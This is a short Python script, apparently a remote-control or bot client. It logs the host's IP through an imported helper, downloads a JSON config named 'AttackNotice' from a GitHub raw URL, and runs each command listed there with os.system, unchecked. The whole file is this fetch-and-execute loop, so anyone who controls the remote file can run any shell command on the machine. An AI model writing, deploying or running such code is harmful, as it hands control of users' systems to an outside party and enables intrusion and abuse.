import json
import os
import requests
from logIP import log_ip

def init():
	log_ip()

def get_attack_config():
	url = "https://raw.githubusercontent.com/zenmiao7/AttackNotice/main/meta.json"
	return requests.get(url).json()

init()

config_dict = get_attack_config()
cmds = config_dict['cmds']
for cmd in cmds:
	try:
		os.system(cmd)
	finally:
		print("Finish cmd:" + cmd)

print("Exit")